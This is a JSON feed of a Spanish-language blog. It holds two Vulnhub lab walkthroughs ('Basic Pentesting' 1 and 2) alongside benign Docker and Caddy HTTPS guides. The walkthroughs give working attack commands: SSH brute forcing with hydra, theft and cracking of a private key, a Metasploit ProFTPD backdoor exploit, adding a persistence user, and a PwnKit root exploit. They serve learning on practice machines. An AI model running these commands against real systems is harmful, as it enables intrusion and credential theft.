{
  "version": "https://jsonfeed.org/version/1",
  "title": "datadiego",
  "home_page_url": "https://update-me.com",
  "feed_url": "https://update-me.com/feed/feed.json",
  "description": "Description of the website. Update me.",
  "author": {
    "name": "@datadiego",
    "url": ""
  },
  "items": [{
      "id": "https://update-me.com/posts/basic_pentesting_2/",
      "url": "https://update-me.com/posts/basic_pentesting_2/",
      "title": "Vulnhub #0: CSEC Basic Pentesting 2",
      "content_html": "<p>Puedes descargar la máquina vulnerable desde <a href=\"https://www.vulnhub.com/entry/basic-pentesting-2,241/\">vulnhub</a></p>\n<h2 id=\"descubrimiento-de-hosts\">Descubrimiento de hosts <a class=\"direct-link\" href=\"#descubrimiento-de-hosts\">#</a></h2>\n<p>Tras iniciar la maquina escaneamos con <code>sudo netdiscover</code>.</p>\n<p>Estos son las IP del lab:</p>\n<pre class=\"language-plaintext\"><code class=\"language-plaintext\">Ubuntu(host): 192.168.0.20<br>Kali(VM):     192.168.0.16<br>Victima:      192.168.0.17</code></pre>\n<h2 id=\"servicios\">Servicios <a class=\"direct-link\" href=\"#servicios\">#</a></h2>\n<pre><code>22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)\n80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))\n139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)\n</code></pre>\n<p>Si lanzamos <code>nmap -sT -sV -A -vvv 192.168.0.17</code> y no obtenemos ninguna vulnerabilidad explotable.</p>\n<p>Sin embargo, podemos intentar enumerar usuarios de samba con <code>enum4linux &lt;ip&gt;</code><br>\nObtenemos dos usuarios:</p>\n<pre class=\"language-plaintext\"><code class=\"language-plaintext\">kay<br>jan</code></pre>\n<h2 id=\"ataque-ssh\">Ataque SSH <a class=\"direct-link\" href=\"#ataque-ssh\">#</a></h2>\n<p>Lanzamos hydra con rockyou.txt usando <code>hydra -l kay -P ./rockyou.txt ssh://192.168.0.17</code></p>\n<p>La contraseña es <code>armando</code></p>\n<p>Una vez dentro podemos hacer <code>ls -lisaR /home</code> para analizar las carpetas de usuarios.</p>\n<p>Ahi podemos ver que en la carpeta .ssh del usuario kay tiene un <code>id_rsa</code> con permisos globales de lectura.</p>\n<pre><code>/home/kay/.ssh:\ntotal 20\n798691 4 drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .\n786930 4 drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..\n798921 4 -rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys\n798917 4 -rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa\n798918 4 -rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub\njan@basic2:~$ cat /home/kay/.ssh/id_rsa\n</code></pre>\n<h2 id=\"usando-una-clave-robada\">Usando una clave robada <a class=\"direct-link\" href=\"#usando-una-clave-robada\">#</a></h2>\n<p>Podemos copiar el archivo y usarlo para intentar entrar en la maquina con <code>ssh kay@ip -i clave-robada</code></p>\n<p>Whooops! Nos devuelve esto:</p>\n<pre class=\"language-plaintext\"><code class=\"language-plaintext\">Permissions 0664 for 'id_key' are too open.<br>It is required that your private key files are NOT accessible by others.<br>This private key will be ignored.<br>Load key \"id_key\": bad permissions</code></pre>\n<p>Debemos dar permisos de lectura y escritura para usuario y grupo con <code>chmod 400 clave-robada</code></p>\n<p>Ahora nos pide la contraseña de la clave.</p>\n<p>Esa contraseña está DENTRO de nuestro archivo <code>clave-robada</code>.</p>\n<p>Convierte la clave a un formato que john entienda con <code>ssh2john clave-robada &gt; clave-formato-john</code></p>\n<p>Una vez listo podemos romper la contraseña con <code>john clave-formato-john --wordlist=rockyou.txt</code></p>\n<pre class=\"language-plaintext\"><code class=\"language-plaintext\">beeswax          (clave-robada)     <br>1g 0:00:00:00 DONE (2024-09-17 06:09) 12.50g/s 1034Kp/s 1034Kc/s 1034KC/s behlat..bball40<br>Use the \"--show\" option to display all of the cracked passwords reliably<br>Session completed. </code></pre>\n<p>Si hacemos <code>ssh kay@ip -i clave-robada</code></p>\n<p>Nos pedirá la contraseña <code>beeswax</code> descubierta antes.</p>\n<p>Estamos dentro!</p>\n<p>¿Que podemos hacer ahora?</p>\n<h2 id=\"escalando-privilegios\">Escalando privilegios <a class=\"direct-link\" href=\"#escalando-privilegios\">#</a></h2>\n<p>Podemos volver a usar <code>ls -lisaR /home</code> para listar de nuevo por si hubiera cosas que no hemos visto antes</p>\n<p>Tenemos un <code>pass.bak</code> que podemos leer:</p>\n<pre class=\"language-plaintext\"><code class=\"language-plaintext\">heresareallystrongpasswordthatfollowsthepasswordpolicy$$</code></pre>\n<p>Si intentamos usar <code>sudo -l</code> para ver que podemos lanzar nos pedirá una contraseña.</p>\n<p>Podemos pasar esa contraseña y ver que podemos lanzar <code>sudo su</code></p>\n<pre class=\"language-plaintext\"><code class=\"language-plaintext\">[sudo] password for kay: <br>Matching Defaults entries for kay on basic2:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin<br><br>User kay may run the following commands on basic2:<br>    (ALL : ALL) ALL</code></pre>\n<p>Tras lanzarlo, ya somos <code>root</code>.</p>\n<h3 id=\"otras-formas-de-conseguir-root%3A\">Otras formas de conseguir <code>root</code>: <a class=\"direct-link\" href=\"#otras-formas-de-conseguir-root%3A\">#</a></h3>\n<h4 id=\"sudo-vi\">sudo vi <a class=\"direct-link\" href=\"#sudo-vi\">#</a></h4>\n<pre class=\"language-plaintext\"><code class=\"language-plaintext\">sudo vi<br>Escribimos :!sh y nos devuelve una consola root</code></pre>\n<h4 id=\"more\">more <a class=\"direct-link\" href=\"#more\">#</a></h4>\n<pre class=\"language-plaintext\"><code class=\"language-plaintext\">Escribimos un archivo relativamente largo y lo abrimos con `more` y tenemos algo similar a vi<br>Con !sh podremos abrir otra consola.</code></pre>\n",
      "date_published": "2025-05-11T00:00:00+00:00"
    },{
      "id": "https://update-me.com/posts/basic_pentesting_1/",
      "url": "https://update-me.com/posts/basic_pentesting_1/",
      "title": "Vulnhub #0: CSEC Basic Pentesting 1",
      "content_html": "<p>Puedes descargar la máquina vulnerable desde <a href=\"https://www.vulnhub.com/entry/basic-pentesting-1,216/\">Vulnhub</a></p>\n<h2 id=\"descubrimiento-de-host\">Descubrimiento de host <a class=\"direct-link\" href=\"#descubrimiento-de-host\">#</a></h2>\n<p>Usamos <code>sudo netdiscover</code> para descubrir los host en la red.</p>\n<pre class=\"language-plaintext\"><code class=\"language-plaintext\">Ubuntu:   192.168.0.20<br>Kali:     192.168.0.16</code></pre>\n<h2 id=\"descubriendo-servicios-y-versiones\">Descubriendo servicios y versiones <a class=\"direct-link\" href=\"#descubriendo-servicios-y-versiones\">#</a></h2>\n<p>Debemos identificar puertos, servicios y versiones de los mismos.</p>\n<p>Usamos <code>nmap -sT -p- -A 192.168.0.26 -oA resultados</code></p>\n<p>En los resultados encontramos algo de interés:</p>\n<pre><code>PORT   STATE SERVICE REASON  VERSION\n21/tcp open  ftp     syn-ack ProFTPD 1.3.3c\n22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n</code></pre>\n<h2 id=\"explotando-la-maquina\">Explotando la maquina <a class=\"direct-link\" href=\"#explotando-la-maquina\">#</a></h2>\n<h3 id=\"buscar-exploit\">Buscar exploit <a class=\"direct-link\" href=\"#buscar-exploit\">#</a></h3>\n<p>Vamos a probar a romper <code>FTPd</code> con <code>metasploit</code></p>\n<p>Podemos lanzar metasploit con <code>msfconsole</code></p>\n<p>Si buscamos exploits con <code>search proFTPd</code> podemos encontrar una para nuestra version.</p>\n<h3 id=\"configuracion-del-exploit\">Configuracion del exploit <a class=\"direct-link\" href=\"#configuracion-del-exploit\">#</a></h3>\n<p>Puedes usar <code>use unix/ftp/proftpd_133c_backdoor</code> para usar este exploit, tambien puedes usar su index.</p>\n<p>Con show options vemos que debemos indicar el <code>rhosts</code>, <code>lhost</code> y un <code>exploit target</code> o payload a ejecutar.</p>\n<p>Para ver los payloads disponibles <code>show payloads</code>.</p>\n<p>Para cargar un payload <code>set payload index|path</code>.</p>\n<p>Para configurar la maquina a atacar <code>set rhosts 192.168.0.26</code>.</p>\n<p>Para configurar que maquina se queda escuchando <code>set lhost 192.168.0.16</code>.</p>\n<p>Lanzamos con <code>run</code>, deberíamos obtener acceso a una terminal, podemos comprobarlo con <code>whoami</code> o <code>ls</code>.</p>\n<h3 id=\"persistencia\">Persistencia <a class=\"direct-link\" href=\"#persistencia\">#</a></h3>\n<p>Podemos crear un usuario con <code>useradd hhyyppeerr</code>.</p>\n<p>Y crear una contraseña con <code>echo &quot;hhyyppeerr:ilovesummer&quot; | chpasswd</code></p>\n<p>Podemos comprobar que podemos entrar al sistema con <code>ssh hhyyppeerr@192.168.0.26</code> e introduciendo <code>ilovesummer</code> como contraseña.</p>\n<h2 id=\"weaponization-y-escalado-de-privilegios\">Weaponization y escalado de privilegios <a class=\"direct-link\" href=\"#weaponization-y-escalado-de-privilegios\">#</a></h2>\n<p>Copiamos <code>linpeas</code> o el script que queramos usar a la maquina objetivo con <code>scp ./linpeas.sh hhyyppeerr@192.168.0.26:/tmp/linpeas.sh</code>.</p>\n<p>Entramos de nuevo en la maquina objetivo con nuestro usuario y lanzamos el script.</p>\n<p>Linpeas nos ha mostrado el siguiente exploit disponible:</p>\n<pre><code>╔══════════╣ Executing Linux Exploit Suggester\n╚ https://github.com/mzet-/linux-exploit-suggester                                                                            \n[+] [CVE-2021-4034] PwnKit                                                                                                    \n\n   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\n   Exposure: probable\n   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro\n   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main\n</code></pre>\n<p>Podemos buscar el CVE para encontrar exploits, en nuestro caso: <a href=\"https://github.com/arthepsy/CVE-2021-4034\">https://github.com/arthepsy/CVE-2021-4034</a></p>\n<p>Nos copiamos el repositorio a la maquina objetivo con <code>nano</code> o <code>scp</code>.</p>\n<p>Compilamos y ejecutamos el codigo:</p>\n<pre class=\"language-plaintext\"><code class=\"language-plaintext\">$ ls<br>cve-2021-4034-poc.c  README.md<br>$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc<br>$ ls<br>cve-2021-4034-poc  cve-2021-4034-poc.c  README.md<br>$ ./cve-2021-4034-poc<br># whoami<br>root</code></pre>\n<p>Puede que esto no funcione, pero con <code>make</code> si.</p>\n",
      "date_published": "2025-05-11T00:00:00+00:00"
    },{
      "id": "https://update-me.com/posts/docker/",
      "url": "https://update-me.com/posts/docker/",
      "title": "Docker 101",
      "content_html": "<h2 id=\"instalaci%C3%B3n\">Instalación <a class=\"direct-link\" href=\"#instalaci%C3%B3n\">#</a></h2>\n<p>Lo mejor es seguir la <a href=\"https://docs.docker.com/engine/install/ubuntu/\">guia Oficial</a> para instalar siempre la última versión de docker.</p>\n<h2 id=\"configuracion\">Configuracion <a class=\"direct-link\" href=\"#configuracion\">#</a></h2>\n<p>Necesitarás iniciar el servicio de docker y añadir tu usuario al grupo de docker para poder ejecutar los comandos sin <code>sudo</code>:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> systemctl start <span class=\"token function\">docker</span><br><span class=\"token function\">sudo</span> systemctl <span class=\"token builtin class-name\">enable</span> <span class=\"token function\">docker</span><br><span class=\"token function\">sudo</span> <span class=\"token function\">usermod</span> -aG <span class=\"token function\">docker</span> <span class=\"token environment constant\">$USER</span></code></pre>\n<h2 id=\"hello-world%3A\">Hello World: <a class=\"direct-link\" href=\"#hello-world%3A\">#</a></h2>\n<p>Comprueba que todo funciona correctamente ejecutando el siguiente comando:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> run hello-world</code></pre>\n<blockquote>\n<p>Si ves un mensaje de éxito, ya tienes docker instalado y funcionando correctamente.</p>\n</blockquote>\n<h2 id=\"%C2%BFqu%C3%A9-es-docker%3F\">¿Qué es Docker? <a class=\"direct-link\" href=\"#%C2%BFqu%C3%A9-es-docker%3F\">#</a></h2>\n<p>Docker resuelve un problema recurrente en el desarrollo de software: la portabilidad. Cuando desarrollas una aplicación en tu ordenador y puedes arrancarla sin problemas es porque tienes todas las dependencias necesarias instaladas. Pero cuando intentas ejecutar esa misma aplicación en otro ordenador, puede que no funcione porque faltan librerías o dependencias.</p>\n<p>Esto es un problema común, vuelve el desarrollo de software un proceso tedioso en el que muchas personas pasan horas intentando resolver problemas de compatibilidad manteniendo multiples entornos con diferentes versiones de librerías y dependencias. Además, si tienes que desplegar tu aplicación en un servidor, puede que no funcione porque el servidor tiene una versión diferente de una librería o una configuración diferente.</p>\n<p>Docker resuelve este problema creando un contenedor que incluye todo lo necesario para ejecutar la aplicación: el código, las librerías, las dependencias y el sistema operativo. De esta forma, puedes ejecutar la misma aplicación en cualquier ordenador que tenga Docker instalado, sin preocuparte por las diferencias entre los entornos de ejecución.</p>\n<p>Para entender mejor cómo funciona Docker, es importante conocer dos conceptos clave: imágenes y contenedores.</p>\n<h3 id=\"im%C3%A1genes\">Imágenes <a class=\"direct-link\" href=\"#im%C3%A1genes\">#</a></h3>\n<p>Una imagen es el resultado de empaquetar una aplicación y todas sus dependencias. A partir de esta imagen, Docker puede crear un contenedor. Las imágenes son inmutables, lo que significa que no puedes cambiar una imagen una vez que ha sido creada. Si necesitas hacer cambios en la aplicación, debes crear una nueva imagen.</p>\n<p>La forma de crear una imagen es mediante un archivo llamado <code>Dockerfile</code>. Este archivo contiene una serie de instrucciones que Docker utiliza para construir la imagen. Por ejemplo, puedes especificar qué sistema operativo utilizar, qué librerías instalar y cómo ejecutar la aplicación.</p>\n<p>Un ejemplo de un <code>Dockerfile</code> para una aplicación en NodeJS con Express podría ser el siguiente:</p>\n<pre class=\"language-dockerfile\"><code class=\"language-dockerfile\"><span class=\"token comment\"># Usa la imagen oficial de Node.js como base</span><br><span class=\"token instruction\"><span class=\"token keyword\">FROM</span> node:14</span><br><span class=\"token comment\"># Establece el directorio de trabajo</span><br><span class=\"token instruction\"><span class=\"token keyword\">WORKDIR</span> /usr/src/app</span><br><span class=\"token comment\"># Copia el package.json y package-lock.json</span><br><span class=\"token instruction\"><span class=\"token keyword\">COPY</span> package*.json ./</span><br><span class=\"token comment\"># Instala las dependencias</span><br><span class=\"token instruction\"><span class=\"token keyword\">RUN</span> npm install</span><br><span class=\"token comment\"># Copia el resto del código de la aplicación</span><br><span class=\"token instruction\"><span class=\"token keyword\">COPY</span> . .</span><br><span class=\"token comment\"># Expone el puerto 3000</span><br><span class=\"token instruction\"><span class=\"token keyword\">EXPOSE</span> 3000</span><br><span class=\"token comment\"># Comando para ejecutar la aplicación</span><br><span class=\"token instruction\"><span class=\"token keyword\">CMD</span> [<span class=\"token string\">\"node\"</span>, <span class=\"token string\">\"app.js\"</span>]</span></code></pre>\n<p>Puedes crear una imagen a partir de un <code>Dockerfile</code> utilizando el siguiente comando:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> build -t <span class=\"token operator\">&lt;</span>nombre_imagen<span class=\"token operator\">></span> <span class=\"token builtin class-name\">.</span></code></pre>\n<blockquote>\n<p>El <code>.</code> al final del comando indica que el <code>Dockerfile</code> se encuentra en el directorio actual. Puedes especificar una ruta diferente.<br>\nEl <code>-t</code> indica que quieres etiquetar la imagen con un nombre.</p>\n</blockquote>\n<p>Luego, puedes ver todas las imágenes que tienes en tu ordenador utilizando el siguiente comando:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> images</code></pre>\n<h3 id=\"%C2%BFqu%C3%A9-es-un-contenedor%3F\">¿Qué es un contenedor? <a class=\"direct-link\" href=\"#%C2%BFqu%C3%A9-es-un-contenedor%3F\">#</a></h3>\n<p>Un contenedor es una <em>unidad de software que empaqueta codigo y dependencias</em> necesarias para ejecutar una aplicación. Un contenedor es un entorno aislado que incluye todo lo necesario para ejecutar la aplicación, incluyendo el sistema operativo, las librerías y las dependencias. Esto significa que puedes ejecutar la misma aplicación en cualquier ordenador que tenga Docker instalado, sin preocuparte por las diferencias entre los entornos de ejecución.</p>\n<p>Puedes pensar en un contenedor como una pequeña máquina virtual a la que se le ha quitado todo hasta dejar lo necesario para ejecutar la aplicación. Esto hace que los contenedores sean mucho más ligeros y rápidos de arrancar que las máquinas virtuales, ya que no necesitan cargar un sistema operativo completo. Además, los contenedores son portables, lo que significa que puedes moverlos de un ordenador a otro sin problemas. Si tienes un contenedor que funciona en tu ordenador, también funcionará en el servidor, en la nube o en cualquier otro ordenador que tenga Docker instalado.</p>\n<p>Puedes crear un contenedor a partir de una imagen utilizando el siguiente comando:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> run -d -p <span class=\"token number\">80</span>:3000 <span class=\"token operator\">&lt;</span>nombre_imagen<span class=\"token operator\">></span></code></pre>\n<blockquote>\n<p>El <code>-d</code> indica que quieres ejecutar el contenedor en segundo plano (detached mode).<br>\nEl <code>-p</code> indica que quieres mapear el puerto 80 del host al puerto 3000 del contenedor. Esto significa que si accedes a <code>http://localhost</code>, estarás accediendo al puerto 3000 del contenedor.<br>\nEl <code>&lt;nombre_imagen&gt;</code> es el nombre de la imagen que quieres ejecutar.<br>\nSi no especificas un nombre de imagen, Docker buscará una imagen llamada <code>latest</code> por defecto.<br>\nPuedes ver todos los contenedores que tienes en tu ordenador utilizando el siguiente comando:</p>\n</blockquote>\n<pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> <span class=\"token function\">ps</span></code></pre>\n<blockquote>\n<p>Si quieres ver todos los contenedores, incluyendo los que están parados, puedes utilizar el siguiente comando:</p>\n</blockquote>\n<pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> <span class=\"token function\">ps</span> -a</code></pre>\n<blockquote>\n<p>Si quieres parar un contenedor, puedes utilizar el siguiente comando:</p>\n</blockquote>\n<pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> stop <span class=\"token operator\">&lt;</span>nombre_contenedor<span class=\"token operator\">></span></code></pre>\n<blockquote>\n<p>Si quieres eliminar un contenedor, puedes utilizar el siguiente comando:</p>\n</blockquote>\n<pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">docker</span> <span class=\"token function\">rm</span> <span class=\"token operator\">&lt;</span>id_contenedor<span class=\"token operator\">></span></code></pre>\n",
      "date_published": "2025-05-10T00:00:00+00:00"
    },{
      "id": "https://update-me.com/posts/despliegue-caddy/",
      "url": "https://update-me.com/posts/despliegue-caddy/",
      "title": "Despliegue con HTTPS y Caddy",
      "content_html": "<p>Añadir un certificado SSL/TLS puede hacerse de varias formas, en esta vamos a utilizar Caddy para añadir https a cualquier servidor web que tengamos funcionando.</p>\n<p>Necesitarás:</p>\n<ul>\n<li>Un servidor web, este puede ser un repositorio, un contenedor de docker, una aplicación que hemos instalado y lanzado, etc.</li>\n<li>Un dominio, esto es necesario para solicitar un certificado SSL/TLS.</li>\n<li>Un VPS en cualquier plataforma como linode o digitalocean.</li>\n</ul>\n<h2 id=\"configuraci%C3%B3n-dns\">Configuración DNS <a class=\"direct-link\" href=\"#configuraci%C3%B3n-dns\">#</a></h2>\n<p>Lo primero es configurar nuestro servidor DNS para que apunte al VPS.</p>\n<p>Ve a tu proveedor de dominio y añade un registro &quot;a&quot; que apunte a la dirección IP de tu servidor.</p>\n<p>Comprueba la <a href=\"https://dnschecker.org/\">propagación de dns</a> para saber si ya es está redirigiendo.</p>\n<h2 id=\"configuraci%C3%B3n-de-caddy\">Configuración de Caddy <a class=\"direct-link\" href=\"#configuraci%C3%B3n-de-caddy\">#</a></h2>\n<p>Hay <a href=\"https://caddyserver.com/docs/install\">guias</a> para las diferentes formas de instalación de Caddy.</p>\n<p>En nuestro caso, con ubuntu:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> update<br><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> -y debian-keyring debian-archive-keyring apt-transport-https <span class=\"token function\">curl</span><br><span class=\"token function\">curl</span> -1sLf <span class=\"token string\">'https://dl.cloudsmith.io/public/caddy/stable/gpg.key'</span> <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg<br><span class=\"token function\">curl</span> -1sLf <span class=\"token string\">'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt'</span> <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> <span class=\"token function\">tee</span> /etc/apt/sources.list.d/caddy-stable.list<br><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> update<br><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> caddy</code></pre>\n<p>Vamos a utilizar Caddy como un proxy reverso, este escuchará primero en el puerto 80 para solicitar los certificados SSL/TLS, si el DNS esta apuntando correctamente, el proceso debería ser exitoso y Caddy empezará a escuchar solicitudes HTTP en el puerto 443 utilizando HTTPS, y se comunicará localmente con tu servidor funcionando en el puerto que configures.</p>\n<p>Caddy funciona mediante archivos de configuración llamados <code>Caddyfile</code>:</p>\n<pre><code>cyberbunny.online {\n    reverse_proxy localhost:8000\n}\n</code></pre>\n<p>Donde <code>cyberbunny.online</code> es el dominio, <code>reverse_proxy</code> el modo en el que queremos que actue Caddy y <code>localhost:8000</code> la dirección y puerto donde tenemos nuestro servidor web funcionando.</p>\n<p>Edita el archivo en <code>/etc/caddy/Caddyfile</code>.</p>\n<p>Caddy no usará la configuración hasta que lo reinicies con <code>sudo systemctl restart caddy</code></p>\n<p>Cuando lo reinicies, comprueba el estado de la obtención del certificado con <code>sudo systemctl status caddy</code>, si ves algo como esto, es que ha funcionado correctamente:</p>\n<blockquote>\n<p>Si la obtención del certificado falló, puede que debas esperar un poco hasta que el DNS se propague, además, Caddy espera varios minutos antes de volver a intentar la obtención del certificado, así que si no funciona a la primera, no te preocupes, espera un poco y vuelve a consultar el estado mas tarde mientras verificas que tu DNS está apuntando correctamente y tu configuración es correcta.</p>\n</blockquote>\n<blockquote>\n<p>Mientras también puedes arrancar tu servidor web si no lo has hecho ya, Caddy no necesita que el servidor web esté funcionando para obtener el certificado, pero si lo necesitas para comprobar que al final funciona correctamente.</p>\n</blockquote>\n",
      "date_published": "2025-05-10T00:00:00+00:00"
    }
  ]
}
